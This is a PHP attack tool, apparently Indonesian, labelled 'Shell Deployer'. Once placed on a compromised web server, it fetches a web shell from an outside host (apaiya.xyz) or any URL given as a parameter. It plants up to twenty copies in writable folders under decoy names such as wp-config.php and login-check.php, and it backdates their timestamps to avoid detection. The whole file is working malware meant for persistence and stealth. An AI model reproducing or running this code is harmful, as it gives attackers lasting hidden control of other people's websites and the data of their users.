<?php
ignore_user_abort(true);
set_time_limit(0);
ini_set('display_errors', 0);
error_reporting(0);

// ============================================
// KONFIGURASI URL DEFAULT (BISA DIGANTI VIA WGET)
// ============================================
$default_url = "https://apaiya.xyz/up/raw_2281f49a6ef40d57701a46854523a81b.txt";

// Jika ada parameter ?url= di GET, gunakan itu
if (isset($_GET['url']) && !empty($_GET['url'])) {
    $target_url = $_GET['url'];
} else {
    $target_url = $default_url;
}

/**
 * Download content dari URL
 */
function downloadFromUrl($url) {
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
    curl_setopt($ch, CURLOPT_TIMEOUT, 30);
    curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36');
    
    $content = curl_exec($ch);
    $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    curl_close($ch);
    
    if ($httpCode == 200 && $content) {
        return $content;
    }
    
    // Fallback ke file_get_contents
    if (ini_get('allow_url_fopen')) {
        return @file_get_contents($url);
    }
    
    return false;
}

/**
 * Scan folder writable hingga kedalaman tertentu
 */
function scanWritableDirs($baseDir, $maxDepth = 5, $currentDepth = 0) {
    $result = [];

    if ($currentDepth > $maxDepth) return $result;
    $items = @scandir($baseDir);
    if (!$items) return $result;

    foreach ($items as $item) {
        if ($item === '.' || $item === '..') continue;

        $fullPath = rtrim($baseDir, '/') . '/' . $item;
        if (is_dir($fullPath)) {
            if (is_writable($fullPath)) {
                $result[] = $fullPath;
            }
            $result = array_merge(
                $result,
                scanWritableDirs($fullPath, $maxDepth, $currentDepth + 1)
            );
        }
    }

    return $result;
}

/**
 * Stock nama file yang banyak biar bisa milih dan bergantian
 */
function getStockFilenames() {
    return [
        'notes.php',
        'data-info.php', 
        'extra-file.php',
        'sample-page.php',
        'draft-note.php',
        'temp-data.php',
        'manual-page.php',
        'archive-note.php',
        'backup-data.php',
        'config-setting.php',
        'system-info.php',
        'error-log.php',
        'debug-mode.php',
        'temp-file.php',
        'cache-data.php',
        'session-info.php',
        'user-data.php',
        'admin-page.php',
        'login-check.php',
        'auth-system.php',
        'api-endpoint.php',
        'webhook-listener.php',
        'cron-job.php',
        'task-runner.php',
        'mailer.php',
        'smtp-test.php',
        'db-connect.php',
        'sql-query.php',
        'file-manager.php',
        'image-upload.php',
        'index.php',
        'wp-config.php',
        'config.php',
        'settings.php',
        'backup.php',
        'cache.php',
        'temp.php',
        'log.php'
    ];
}
?>
<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <title>Shell Deployer - WGET Mode</title>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <style>
        :root {
            --primary: #00ff00;
            --background: #000000;
            --surface: #111111;
            --text: #00ff00;
            --success: #00ff00;
            --error: #ff0000;
            --border: #333333;
        }
        * { box-sizing: border-box; font-family: 'Courier New', monospace; }
        body { margin: 0; padding: 0; background-color: var(--background); color: var(--text); display: flex; align-items: center; justify-content: center; min-height: 100vh; }
        .card { background-color: var(--surface); border: 2px solid var(--primary); border-radius: 0px; padding: 30px; width: 100%; max-width: 900px; box-shadow: 0 0 20px var(--primary); }
        h1 { text-align: center; color: var(--primary); font-weight: bold; margin-bottom: 20px; text-transform: uppercase; border-bottom: 1px solid #333; padding-bottom: 10px; }
        h2 { color: #00ffff; font-size: 16px; margin: 15px 0 10px; }
        label { display: block; margin-bottom: 10px; font-size: 14px; color: #00ff00; }
        .url-input { width: 100%; background-color: #000000; color: var(--text); border: 2px solid var(--primary); border-radius: 0px; padding: 15px; margin-bottom: 20px; font-size: 14px; font-family: monospace; }
        .info-box { background: #000; border: 1px solid #00ff00; padding: 15px; margin-bottom: 20px; }
        .info-box small { color: #00ffff; }
        button { width: 100%; background: #000000; color: var(--primary); font-weight: bold; border: 2px solid var(--primary); border-radius: 0px; padding: 15px; cursor: pointer; font-size: 16px; transition: all 0.2s ease; text-transform: uppercase; margin: 5px 0; }
        button:hover { background: var(--primary); color: #000000; }
        .button-group { display: flex; gap: 10px; }
        .button-group button { flex: 1; }
        .message { margin-top: 25px; padding: 15px; border-radius: 0px; font-size: 14px; line-height: 1.5; border: 1px solid; }
        .success { background-color: rgba(0, 255, 0, 0.1); color: var(--success); border-color: var(--success); }
        .error { background-color: rgba(255, 0, 0, 0.1); color: var(--error); border-color: var(--error); }
        .warning { background-color: rgba(255, 255, 0, 0.1); color: #ffff00; border-color: #ffff00; }
        code { font-family: 'Courier New', monospace; font-size: 12px; color: #00ff00; }
        ul { margin: 10px 0 0 0; padding: 0; list-style: none; }
        li { padding: 8px 0; border-bottom: 1px solid #333; }
        li:last-child { border-bottom: none; }
        a { color: #00ffff; text-decoration: none; }
        a:hover { text-decoration: underline; color: #ffffff; }
        .url-box { background: #000; border: 1px solid #333; padding: 10px; margin: 5px 0; word-break: break-all; }
        .file-info { color: #00aa00; font-size: 11px; margin-left: 10px; }
        .terminal { background: #000; border: 1px solid #00ff00; padding: 15px; margin-top: 20px; font-family: monospace; font-size: 12px; max-height: 400px; overflow-y: auto; }
        .blink { animation: blink 1s infinite; }
        @keyframes blink { 50% { opacity: 0; } }
        .stock-info { color: #00ffff; font-size: 11px; margin-top: 5px; border-top: 1px solid #333; padding-top: 10px; }
        .stats { display: flex; gap: 10px; margin: 10px 0; }
        .stat-box { flex: 1; background: #000; border: 1px solid #00ff00; padding: 10px; text-align: center; }
        .stat-value { font-size: 24px; font-weight: bold; color: #ffff00; }
        .stat-label { font-size: 11px; color: #00ff00; }
        .wget-command { background: #000; border-left: 4px solid #00ff00; padding: 10px; margin: 10px 0; font-family: monospace; color: #ffff00; }
    </style>
</head>
<body>
<div class="card">
    <h1>⚡ SHELL DEPLOYER - WGET MODE ⚡</h1>
    
    <div class="info-box">
        <strong>📌 CARA PAKAI VIA WGET:</strong>
        <div class="wget-command">
            wget -O deploy.php "http://<?php echo $_SERVER['HTTP_HOST']; ?><?php echo $_SERVER['PHP_SELF']; ?>?url=https://target.com/shell.txt"<br>
            php deploy.php
        </div>
        <small>Atau akses langsung dengan parameter ?url=</small>
    </div>

    <div class="stock-info">
        📁 Stock names: <?php echo implode(', ', array_slice(getStockFilenames(), 0, 8)); ?> ... dan <?php echo count(getStockFilenames()) - 8; ?> lainnya
    </div>

    <form method="GET">
        <label for="url">📎 URL SHELL (dari wget):</label>
        <input type="url" class="url-input" name="url" id="url" value="<?php echo htmlspecialchars($target_url); ?>" placeholder="https://example.com/shell.txt" required>
        
        <label for="copies">📋 Jumlah copy (max 20):</label>
        <input type="number" class="url-input" name="copies" id="copies" min="1" max="20" value="5">
        
        <div class="button-group">
            <button type="submit" name="action" value="deploy">🚀 DEPLOY FROM URL</button>
            <button type="submit" name="action" value="scan" style="background:#000; color:#ffff00;">🔍 SCAN ONLY</button>
        </div>
    </form>

<?php
if (isset($_GET['action'])) {
    $action = $_GET['action'];
    $copies = isset($_GET['copies']) ? min(max(1, intval($_GET['copies'])), 20) : 5;
    
    echo '<div class="terminal">';
    echo '$ <span class="blink">▋</span> WGET MODE ACTIVATED<br>';
    echo '$ <span class="blink">▋</span> Target URL: ' . htmlspecialchars($target_url) . '<br>';
    echo '$ <span class="blink">▋</span> Copy count: ' . $copies . '<br>';
    
    if ($action === 'deploy') {
        // Download dari URL
        echo '$ <span class="blink">▋</span> Downloading shell from URL...<br>';
        
        $shell_content = downloadFromUrl($target_url);
        
        if (!$shell_content) {
            echo '<span style="color:#ff0000">✗ Failed to download from URL</span><br>';
            echo '</div>';
            echo "<div class='message error'>ERROR: Gagal download dari URL. Cek koneksi atau URL.</div>";
        } else {
            echo '$ <span style="color:#00ff00">✓ Download successful! Size: ' . number_format(strlen($shell_content)) . ' bytes</span><br>';
            
            // Scan writable directories
            echo '$ <span class="blink">▋</span> Scanning writable directories...<br>';
            $allWritable = scanWritableDirs(__DIR__, 6);
            
            if (empty($allWritable)) {
                echo '<span style="color:#ff0000">✗ No writable directories found</span><br>';
                echo '</div>';
                echo "<div class='message error'>ERROR: Tidak ditemukan folder writable.</div>";
            } else {
                shuffle($allWritable);
                $stockFilenames = getStockFilenames();
                $successCount = 0;
                $uploadedURLs = [];
                
                echo '$ <span class="blink">▋</span> Found ' . count($allWritable) . ' writable directories<br>';
                echo '$ <span class="blink">▋</span> Deploying ' . $copies . ' copies...<br>';
                
                for ($copy = 1; $copy <= $copies; $copy++) {
                    if (empty($allWritable)) break;
                    
                    // Get random folder
                    $randomKey = array_rand($allWritable);
                    $folder = $allWritable[$randomKey];
                    unset($allWritable[$randomKey]);
                    
                    $randomDateTime = date('Y-m-d H:i', strtotime('-' . rand(0, 90) . ' days'));
                    $timestamp = strtotime($randomDateTime);
                    
                    // Pilih nama random dari stock
                    $randomName = $stockFilenames[array_rand($stockFilenames)];
                    $target = $folder . DIRECTORY_SEPARATOR . $randomName;
                    
                    // Save shell file
                    if (@file_put_contents($target, $shell_content) !== false) {
                        @touch($target, $timestamp, $timestamp);
                        @chmod($target, 0644);
                        
                        // Generate URL
                        $docRoot = realpath($_SERVER['DOCUMENT_ROOT']);
                        $folderPath = realpath($folder);
                        
                        if (strpos($folderPath, $docRoot) === 0) {
                            $relativePath = substr($folderPath, strlen($docRoot));
                        } else {
                            $relativePath = str_replace($docRoot, '', $folderPath);
                        }
                        
                        $relativePath = str_replace('\\', '/', $relativePath);
                        $relativePath = trim($relativePath, '/');
                        
                        $protocol = (!empty($_SERVER['HTTPS']) && $_SERVER['HTTPS'] !== 'off') ? 'https' : 'http';
                        $host = $_SERVER['HTTP_HOST'];
                        
                        $url = $protocol . '://' . $host . '/' . $relativePath . '/' . $randomName;
                        $url = preg_replace('/([^:])\/\//', '$1/', $url);
                        
                        $successCount++;
                        $uploadedURLs[] = [
                            'url' => $url,
                            'filename' => $randomName,
                            'folder' => $folder,
                            'size' => strlen($shell_content)
                        ];
                        
                        echo '  ✓ Copy ' . $copy . ': ' . $randomName . '<br>';
                    } else {
                        echo '  ✗ Copy ' . $copy . ': Failed to write to ' . basename($folder) . '<br>';
                    }
                    
                    // Flush output biar keliatan realtime
                    @ob_flush();
                    @flush();
                }
                
                echo '$ <span class="blink">▋</span> Deployment complete!<br>';
                echo '</div>';
                
                if ($successCount > 0) {
                    echo "<div class='message success'>";
                    echo "<div class='stats'>";
                    echo "<div class='stat-box'><div class='stat-value'>{$successCount}</div><div class='stat-label'>FILES DEPLOYED</div></div>";
                    echo "<div class='stat-box'><div class='stat-value'>" . number_format(strlen($shell_content)) . "</div><div class='stat-label'>BYTES EACH</div></div>";
                    echo "<div class='stat-box'><div class='stat-value'>" . count($stockFilenames) . "</div><div class='stat-label'>STOCK NAMES</div></div>";
                    echo "</div>";
                    
                    echo "<strong>✅ SUCCESS: {$copies} copies from WGET</strong><br><br>";
                    echo "<strong>📋 DEPLOYED FILES:</strong>";
                    echo "<ul>";
                    foreach ($uploadedURLs as $index => $fileData) {
                        $number = $index + 1;
                        echo "<li>";
                        echo "<div class='url-box'>";
                        echo "<strong>[{$number}]</strong> <a href=\"{$fileData['url']}\" target=\"_blank\">{$fileData['url']}</a>";
                        echo "<div class='file-info'>";
                        echo "📁 " . htmlspecialchars(basename(dirname($fileData['folder']))) . "/ → <strong style='color:#ffff00'>{$fileData['filename']}</strong>";
                        echo "</div>";
                        echo "</div>";
                        echo "</li>";
                    }
                    echo "</ul>";
                    
                    // One-click access
                    echo "<br><div style='text-align:center;'>";
                    echo "<button onclick='openAllShells()' style='width:auto;padding:10px 20px;margin:5px;background:#000;color:#0f0;'>🖥️ OPEN ALL SHELLS</button> ";
                    echo "<button onclick='copyAllURLs()' style='width:auto;padding:10px 20px;margin:5px;background:#000;color:#0ff;'>📋 COPY ALL URLS</button>";
                    echo "</div>";
                    
                    echo "</div>";
                    
                    // JavaScript
                    echo "<script>
                    function openAllShells() {
                        " . implode("\n", array_map(function($file) {
                            return "window.open('{$file['url']}', '_blank');";
                        }, $uploadedURLs)) . "
                    }
                    
                    function copyAllURLs() {
                        const urls = `" . implode("\n", array_map(function($file) {
                            return $file['url'];
                        }, $uploadedURLs)) . "`;
                        navigator.clipboard.writeText(urls).then(() => {
                            alert('All shell URLs copied to clipboard!');
                        });
                    }
                    </script>";
                } else {
                    echo "<div class='message error'>✗ ERROR: Failed to deploy shells to any directory.</div>";
                }
            }
        }
    } else { // SCAN action
        echo '$ <span class="blink">▋</span> SCAN MODE - No deployment<br>';
        echo '$ <span class="blink">▋</span> Scanning writable directories...<br>';
        
        $allWritable = scanWritableDirs(__DIR__, 6);
        
        if (empty($allWritable)) {
            echo '<span style="color:#ff0000">✗ No writable directories found</span><br>';
            echo '</div>';
            echo "<div class='message error'>ERROR: Tidak ditemukan folder writable.</div>";
        } else {
            echo '$ <span class="blink">▋</span> Found ' . count($allWritable) . ' writable directories<br>';
            echo '$ <span class="blink">▋</span> Scan complete!<br>';
            echo '</div>';
            
            echo "<div class='message success'>";
            echo "<strong>🔍 SCAN RESULT:</strong><br>";
            echo "Total folder writable: " . count($allWritable) . "<br>";
            echo "Current directory: " . __DIR__ . "<br><br>";
            
            echo "<strong>📁 WRITABLE FOLDERS:</strong>";
            echo "<ul>";
            $displayCount = 0;
            foreach ($allWritable as $folder) {
                if ($displayCount < 20) {
                    echo "<li>📁 " . htmlspecialchars($folder) . "</li>";
                }
                $displayCount++;
            }
            if (count($allWritable) > 20) {
                echo "<li>... dan " . (count($allWritable) - 20) . " folder lainnya</li>";
            }
            echo "</ul>";
            echo "</div>";
        }
    }
}
?>
</div>

<script>
// Auto-submit? Tidak, biar user yang klik

// Terminal auto-scroll
document.addEventListener('DOMContentLoaded', function() {
    const terminal = document.querySelector('.terminal');
    if (terminal) {
        terminal.scrollTop = terminal.scrollHeight;
    }
});

// Confirm before deploy
document.querySelector('form').addEventListener('submit', function(e) {
    if (document.querySelector('button[value="deploy"]:focus')) {
        if (!confirm('🚀 Deploy shells dari URL sekarang?')) {
            e.preventDefault();
        }
    }
});
</script>
</body>
</html>
